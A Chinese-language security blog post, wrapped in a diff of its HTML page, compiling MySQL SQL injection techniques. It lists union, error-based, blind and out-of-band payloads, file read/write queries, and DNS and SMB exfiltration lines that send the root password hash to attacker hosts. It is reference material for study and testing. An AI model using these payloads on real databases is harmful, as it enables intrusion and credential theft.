@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="12345用户输入数据被当成了代码被执行原则有回显:union select、报错注入无回显:dnslog, time-based, boolean-based注：思维导图https://github.com/UltramanGaia/SecMM 最常见的注入12345select * from xxx where id = %s ;select * from xxx where id = &amp;ap">
+<meta name="keywords" content="SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://blog.ultramangaia.cn/blog/2018/SQL注入.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:description" content="12345用户输入数据被当成了代码被执行原则有回显:union select、报错注入无回显:dnslog, time-based, boolean-based注：思维导图https://github.com/UltramanGaia/SecMM 最常见的注入12345select * from xxx where id = %s ;select * from xxx where id = &amp;ap">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/UltramanGaia/SecMM/master/SQL%E6%B3%A8%E5%85%A5.png">
+<meta property="og:updated_time" content="2019-03-09T03:24:30.566Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入">
+<meta name="twitter:description" content="12345用户输入数据被当成了代码被执行原则有回显:union select、报错注入无回显:dnslog, time-based, boolean-based注：思维导图https://github.com/UltramanGaia/SecMM 最常见的注入12345select * from xxx where id = %s ;select * from xxx where id = &amp;ap">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/UltramanGaia/SecMM/master/SQL%E6%B3%A8%E5%85%A5.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://blog.ultramangaia.cn/blog/2018/SQL注入.html"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SQL注入 | UltramanGaia's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">UltramanGaia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.ultramangaia.cn/blog/2018/SQL注入.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="UltramanGaia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="UltramanGaia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-02-23 13:57:25" itemprop="dateCreated datePublished" datetime="2018-02-23T13:57:25+08:00">2018-02-23</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-09 11:24:30" itemprop="dateModified" datetime="2019-03-09T11:24:30+08:00">2019-03-09</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/信息安全/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户输入数据被当成了代码被执行</span><br><span class="line">原则</span><br><span class="line">有回显:union select、报错注入</span><br><span class="line">无回显:dnslog, time-based, boolean-based</span><br><span class="line">注：思维导图https://github.com/UltramanGaia/SecMM</span><br></pre></td></tr></table></figure>
+<h2 id="最常见的注入"><a href="#最常见的注入" class="headerlink" title="最常见的注入"></a>最常见的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from xxx where id = %s ;</span><br><span class="line">select * from xxx where id = &apos;%s&apos; ;</span><br><span class="line">select * from xxx where id = &quot;%s&quot; ;</span><br><span class="line">select * from xxx where id = (&apos;%s&apos;) ;</span><br><span class="line">select * from xxx where id = (&quot;%s&quot;) ;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">用</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">char</span><br><span class="line">string</span><br><span class="line">组合看看能不能报错显示出执行的sql语句</span><br><span class="line">检测union select注入</span><br><span class="line">order by 查列数</span><br><span class="line">union select 看回显</span><br><span class="line"></span><br><span class="line">用</span><br><span class="line">or 1=1</span><br><span class="line">or 1=2</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">检测boolean注入</span><br><span class="line"></span><br><span class="line">用</span><br><span class="line">or sleep(3)</span><br><span class="line">检测time_base注入</span><br></pre></td></tr></table></figure>
+<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql 默认端口 3306</span><br></pre></td></tr></table></figure>
+<h2 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h2><h3 id="Union-Select注入"><a href="#Union-Select注入" class="headerlink" title="Union Select注入"></a>Union Select注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">确认列数</span><br><span class="line">order by </span><br><span class="line">union select 1,2,3</span><br><span class="line">union select null,null,null</span><br><span class="line">union select @,@,@</span><br></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1. floor + rand + group by</span><br><span class="line">select * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">select * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));</span><br><span class="line">2. ExtractValue</span><br><span class="line">select * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line">3. UpdateXml</span><br><span class="line">select * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));</span><br><span class="line">4. Name_Const(&gt;5.0.12)</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line">5. Join</span><br><span class="line">select * from(select * from mysql.user a join mysql.user b)c;</span><br><span class="line">select * from(select * from mysql.user a join mysql.user b using(Host))c;</span><br><span class="line">select * from(select * from mysql.user a join mysql.user b using(Host,User))c;</span><br><span class="line">6. exp()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and Exp(~(select * from (select version())a));</span><br><span class="line">7. geometrycollection()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">8. multipoint()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">9. polygon()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">10. multipolygon()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">11. linestring()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line">12. multilinestring()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<h3 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h3><ul>
+<li><p>bool注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">or 1=1</span><br><span class="line">or 1=2</span><br><span class="line">爆数据长度</span><br><span class="line">and length(查询数据语句)=数字</span><br><span class="line">select * from user where id=1 and length((select version()))=23;</span><br><span class="line">爆数据</span><br><span class="line">and mid((查询数据语句),数字,1)=&apos;字符&apos;</span><br><span class="line">select * from user where id=1 and mid((select version()),1,1)=&apos;5&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>时间盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br><span class="line">benchmark()</span><br><span class="line">爆数据长度</span><br><span class="line">and if(length(查询数据语句)=数字,sleep(5),0)</span><br><span class="line">and if(length(查询数据语句)=数字,BENCHMARK(10000000, md5(1)),0)</span><br><span class="line">爆数据</span><br><span class="line">and if(mid((查询数据语句),数字,1)=&apos;字符&apos;,sleep(5),0)</span><br><span class="line">and if(mid((查询数据语句),数字,1)=&apos;字符&apos;,BENCHMARK(10000000, md5(1)),0)</span><br><span class="line">其他操作。。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>dnslog注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\foo.&apos;,(select mid(version(),1,1)),&apos;.attack.com\\&apos;));</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.mysql.ip.port.b182oj.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SMB</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1=1 into outfile &apos;\\\\attacker\\SMBshare\\output.txt&apos;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="小众注入位置"><a href="#小众注入位置" class="headerlink" title="小众注入位置"></a>小众注入位置</h3><ul>
+<li><p>limit 后面//貌似mysql5.7不能用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br><span class="line">ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>order by后面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过条件+排序</span><br><span class="line">order by IF(1=1,name,price) 通过name字段排序</span><br><span class="line">order by (CASE+WHEN+(1=1)+THEN+name+ELSE+price+END)</span><br><span class="line">通过报错</span><br><span class="line">select host from mysql.user order by host|updatexml(1,concat(0x3a,version(),0x3a),1);</span><br><span class="line">select host from mysql.user order by host|extractvalue(1,concat(0x7e,version()));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>like 模糊匹配</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like &apos;%test%&apos;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>regexp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^[a-n]&apos; limit 0,1); // true</span><br><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^[a-g]&apos; limit 0,1); //true</span><br><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^[a-a]&apos; limit 0,1);//false</span><br><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^a[a-n]&apos; limit 0,1);//true</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><h4 id="最常用的获取数据方法"><a href="#最常用的获取数据方法" class="headerlink" title="最常用的获取数据方法"></a>最常用的获取数据方法</h4><p>大于Mysql 5.0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">获取库名</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1</span><br><span class="line">获取表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&apos;mysql&apos; limit 0,1</span><br><span class="line">获取列名</span><br><span class="line">select column_name from information_schema.columns where table_schema= &apos;mysql&apos; and table_name = &apos;db&apos; limit 0,1</span><br><span class="line">获取数据</span><br><span class="line">select name from user; </span><br><span class="line">注：可以用十六进制代替数据库名、表名</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果过滤了空格，linux下可以用下列字符替代</span><br><span class="line">%09 tab水平</span><br><span class="line">%0a 换行</span><br><span class="line">%0d	return </span><br><span class="line">%0b tab垂直</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure>
+<h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1;</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata;</span><br><span class="line">select distinct(Db) from mysql.db;</span><br><span class="line">select distinct(database_name) from mysql.innodb_index_stats;//mysql&gt;5.6</span><br><span class="line">select distinct(database_name) from mysql.innodb_table_stats;//mysql&gt;5.6</span><br></pre></td></tr></table></figure>
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&apos;mysql&apos; limit 0,1</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&apos;mysql&apos; ;</span><br><span class="line">SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &apos;mysql&apos; AND table_schema != &apos;information_schema&apos;</span><br><span class="line">select distinct(table_name) from mysql.innodb_index_stats;//mysql&gt;5.6</span><br><span class="line">select distinct(table_name) from mysql.innodb_table_stats;//mysql&gt;5.6</span><br></pre></td></tr></table></figure>
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema= &apos;mysql&apos; and table_name = &apos;db&apos; limit 0,1</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_schema= &apos;mysql&apos; and table_name = &apos;db&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select group_concat(column_name) from table_name</span><br></pre></td></tr></table></figure>
+<h2 id="双注入Double-Injection"><a href="#双注入Double-Injection" class="headerlink" title="双注入Double Injection"></a>双注入Double Injection</h2><blockquote>
+<p>原理：mysql在 group by时，会先建立一张虚拟表。<br>取第一条记录，执行 floor(rand(0)<em>2)，发现结果为0，查询虚拟表，发现0的键值不存在，则在虚拟表插入<br>的新的数据时 floor(rand(0)</em>2)会被再计算一次，结果为1（第二次计算）<br>取第二条记录，执行 floor(rand(0)<em>2)，发现结果为1（第三次计算），查询虚拟表，发现1的键值存在，所以<br>floor(rand(0)2)不会被计算第二次，直接count()加1，第二条记录查询完毕。<br>再次增加一条的时候<br>floor(rand(0)</em>2)发现结果为0（第4次计算）<br>查询虚拟表，发现0的键值不存在! 那么会在被计算一次<br>结果为1（第5次计算）<br>但是这个 已经存在了。主键值必须唯一。所以插入表就报错了。<br>返回的这个也是个表，每次查询处理计算完插入进去。<br>这样就可以报错了。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));</span><br><span class="line">union select 1,2 from (select+count(*),concat(floor(rand(0)*2),( 查询数据语句))a from information_schema.tables group by a)b</span><br></pre></td></tr></table></figure>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select user, file_priv from mysql.user;//查看权限</span><br><span class="line">select * from users where id = ((&apos;1&apos;)) union select 1,2,load_file(&apos;/etc/passwd&apos;);//若是有权限，但不能读取，应该是secure_file_priv的锅</span><br></pre></td></tr></table></figure>
+<h2 id="输出到文件中-需要知道绝对路径"><a href="#输出到文件中-需要知道绝对路径" class="headerlink" title="输出到文件中(需要知道绝对路径)"></a>输出到文件中(需要知道绝对路径)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = ((&apos;1&apos;)) union select 1,2,users() into outfile &apos;D:\\1.txt&apos;;///var/lib/mysql-files/2.txt</span><br><span class="line">select * from users where id = ((&apos;1&apos;)) union select 1,2,users() into dumpfile &apos;D:\\1.txt&apos;;</span><br><span class="line">outfile 导出可以多行，会有换行等，适合导出文本文件</span><br><span class="line">dumpfile 导出只能是一行，没有换行，适合导出二进制文件</span><br></pre></td></tr></table></figure>
+<h2 id="二次排序注入-存储型的注入"><a href="#二次排序注入-存储型的注入" class="headerlink" title="二次排序注入 (存储型的注入)"></a>二次排序注入 (存储型的注入)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">二次排序注入也称为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</span><br><span class="line">二次排序注入思路：</span><br><span class="line">1. hacker输入的数据会经过转义代入sql语句中，然后，储存在数据库中，在数据库中的数据是没有转义的</span><br><span class="line">2. hacker进行别的操作，将数据库中的数据取出来（未转义）并用于拼接到另外一个sql语句中，这就可以绕过转义了。</span><br><span class="line">假设存在一个账户&quot;admin&quot;，密码不知</span><br><span class="line">创建一个账户&quot;admin&apos;#&quot;，则在数据库中保存有&quot;admin&apos;#&quot;</span><br><span class="line">修改密码的时候，代入sql语句</span><br><span class="line">update users set passwd = &quot;xxxx&quot; where username = &apos;      admin&apos;#    &apos; and passwd = &apos;xxxxxxx&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%df&apos;   -&gt;    %df%5c&apos;</span><br><span class="line">将sql语句解析为gbk编码时，</span><br><span class="line">%df%5c  -&gt;  当成一个字符，后面的&apos;逃逸出来了</span><br><span class="line"></span><br><span class="line">(1) mysql_query，如mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;, $conn)、mysql_query(&quot;setcharacter_set_client = gbk&quot;, $conn)。</span><br><span class="line"></span><br><span class="line">(2) mysql_set_charset，如mysql_set_charset(&quot;gbk&quot;,$conn)。</span><br><span class="line"></span><br><span class="line">(3) mb_convert_encoding，如mb_convert_encoding($sql,&quot;utf8&quot;,&quot;gbk&quot;)，将SQL语句从gbk格式转换为utf8格式时，0x5c被吃掉了。</span><br><span class="line"></span><br><span class="line">(4) iconv，如iconv(&apos;GBK&apos;, &apos;UTF-8&apos;,$sql)</span><br></pre></td></tr></table></figure>
